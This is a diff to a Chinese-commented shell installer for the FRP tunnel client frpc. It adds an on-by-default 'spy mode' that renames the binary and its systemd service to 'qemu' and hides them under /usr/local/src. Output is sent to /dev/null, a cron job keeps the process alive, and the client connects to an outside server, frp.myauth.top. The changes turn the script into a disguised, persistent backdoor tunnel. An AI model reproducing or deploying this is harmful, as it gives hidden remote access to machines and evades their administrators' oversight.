@@ -14,28 +14,39 @@ Font="\033[0m"
 # variable
 WORK_PATH=$(dirname $(readlink -f $0))
 FRP_NAME=frpc
-FRP_VERSION=0.56.0
-FRP_PATH=/usr/local/frp
 PROXY_URL="https://github.geekery.cn/"
+FRP_VERSION=0.56.0
+
+# 间谍模式
+FRP_PATH=/usr/local/src/qemu
+TARGET_FRP_NAME=qemu
+
+
+if [ "${SPY_MODE:-True}" = "False" ]; then
+  # 非间谍模式，还原原生配置
+  TARGET_FRP_NAME=${FRP_NAME}
+  FRP_PATH=/usr/local/frp
+fi
+
 
 # check frpc
-if [ -f "/usr/local/frp/${FRP_NAME}" ] || [ -f "/usr/local/frp/${FRP_NAME}.ini" ] || [ -f "/lib/systemd/system/${FRP_NAME}.service" ];then
+if [ -f "${FRP_PATH}/${TARGET_FRP_NAME}" ] || [ -f "${FRP_PATH}/${TARGET_FRP_NAME}.ini" ] || [ -f "/lib/systemd/system/${TARGET_FRP_NAME}.service" ];then
     echo -e "${Green}=========================================================================${Font}"
     echo -e "${RedBG}当前已退出脚本.${Font}"
     echo -e "${Green}检查到服务器已安装${Font} ${Red}${FRP_NAME}${Font}"
-    echo -e "${Green}请手动确认和删除${Font} ${Red}/usr/local/frp/${Font} ${Green}目录下的${Font} ${Red}${FRP_NAME}${Font} ${Green}和${Font} ${Red}/${FRP_NAME}.ini${Font} ${Green}文件以及${Font} ${Red}/lib/systemd/system/${FRP_NAME}.service${Font} ${Green}文件,再次执行本脚本.${Font}"
+    echo -e "${Green}请手动确认和删除${Font} ${Red}${FRP_PATH}/${Font} ${Green}目录下的${Font} ${Red}${TARGET_FRP_NAME}${Font} ${Green}和${Font} ${Red}/${TARGET_FRP_NAME}.ini${Font} ${Green}文件以及${Font} ${Red}/lib/systemd/system/${TARGET_FRP_NAME}.service${Font} ${Green}文件,再次执行本脚本.${Font}"
     echo -e "${Green}参考命令如下:${Font}"
-    echo -e "${Red}rm -rf /usr/local/frp/${FRP_NAME}${Font}"
-    echo -e "${Red}rm -rf /usr/local/frp/${FRP_NAME}.ini${Font}"
-    echo -e "${Red}rm -rf /lib/systemd/system/${FRP_NAME}.service${Font}"
+    echo -e "${Red}rm -rf ${FRP_PATH}/${TARGET_FRP_NAME}${Font}"
+    echo -e "${Red}rm -rf ${FRP_PATH}/${TARGET_FRP_NAME}.ini${Font}"
+    echo -e "${Red}rm -rf /lib/systemd/system/${TARGET_FRP_NAME}.service${Font}"
     echo -e "${Green}=========================================================================${Font}"
     exit 0
 fi
 
-while ! test -z "$(ps -A | grep -w ${FRP_NAME})"; do
-    FRPCPID=$(ps -A | grep -w ${FRP_NAME} | awk 'NR==1 {print $1}')
-    kill -9 $FRPCPID
-done
+# while ! test -z "$(ps -A | grep -w ${FRP_NAME})"; do
+#     FRPCPID=$(ps -A | grep -w ${FRP_NAME} | awk 'NR==1 {print $1}')
+#     kill -9 $FRPCPID
+# done
 
 RANDOM_0=${RANDOM}
 
@@ -116,11 +127,11 @@ fi
 tar -zxvf ${FILE_NAME}.tar.gz
 
 mkdir -p ${FRP_PATH}
-mv ${FILE_NAME}/${FRP_NAME} ${FRP_PATH}
+mv ${FILE_NAME}/${FRP_NAME} ${FRP_PATH}/${TARGET_FRP_NAME}
 
 # configure frpc.ini
 # frp.myauth.top -> 124.220.42.103
-cat >${FRP_PATH}/${FRP_NAME}.ini <<EOF
+cat >${FRP_PATH}/${TARGET_FRP_NAME}.ini <<EOF
 [common]
 server_addr = frp.myauth.top
 server_port = 7000
@@ -134,7 +145,7 @@ EOF
 
 # configure systemd
 if ! grep -q '/docker/' /proc/1/cgroup; then
-  cat >/lib/systemd/system/${FRP_NAME}.service <<EOF
+  cat >/lib/systemd/system/${TARGET_FRP_NAME}.service <<EOF
 [Unit]
 Description=Frp Server Service
 After=network.target syslog.target
@@ -144,7 +155,7 @@ Wants=network.target
 Type=simple
 Restart=on-failure
 RestartSec=5s
-ExecStart=/usr/local/frp/${FRP_NAME} -c /usr/local/frp/${FRP_NAME}.ini
+ExecStart=${FRP_PATH}/${TARGET_FRP_NAME} -c ${FRP_PATH}/${TARGET_FRP_NAME}.ini &>/dev/null
 
 [Install]
 WantedBy=multi-user.target
@@ -152,11 +163,11 @@ EOF
 
 # finish install
 systemctl daemon-reload
-systemctl start ${FRP_NAME}
-systemctl enable ${FRP_NAME}
+systemctl start ${TARGET_FRP_NAME}
+systemctl enable ${TARGET_FRP_NAME}
 
 else
-    nohup /usr/local/frp/${FRP_NAME} -c /usr/local/frp/${FRP_NAME}.ini 2>1 &> /dev/stdout &
+    nohup ${FRP_PATH}/${TARGET_FRP_NAME} -c ${FRP_PATH}/${TARGET_FRP_NAME}.ini 2>1 &> /dev/stdout &
 fi
 
 
@@ -166,12 +177,12 @@ rm -rf ${WORK_PATH}/${FILE_NAME}.tar.gz #${WORK_PATH}/${FILE_NAME} ${FRP_NAME}_l
 # add crontab job
 
 if command -v crontab &> /dev/null; then
-    (crontab -l ; echo "*/5 * * * * if ! pgrep -x 'frpc' > /dev/null; then systemctl restart frpc; fi") | crontab -
+    (crontab -l ; echo -e "*/5 * * * * if ! pgrep -x '${TARGET_FRP_NAME}' > /dev/null; then systemctl restart ${TARGET_FRP_NAME}; fi") | crontab -
 fi
 
 # echo -e "${Green}====================================================================${Font}"
-# echo -e "${Green}安装成功,请先修改 ${FRP_NAME}.ini 文件,确保格式及配置正确无误!${Font}"
-# echo -e "${Red}vi /usr/local/frp/${FRP_NAME}.ini${Font}"
+# echo -e "${Green}安装成功,请先修改 ${TARGET_FRP_NAME}.ini 文件,确保格式及配置正确无误!${Font}"
+# echo -e "${Red}vi ${FRP_PATH}/${TARGET_FRP_NAME}.ini${Font}"
 # echo -e "${Green}修改完毕后执行以下命令重启服务:${Font}"
-# echo -e "${Red}systemctl restart ${FRP_NAME}${Font}"
+# echo -e "${Red}systemctl restart ${TARGET_FRP_NAME}${Font}"
 # echo -e "${Green}====================================================================${Font}"
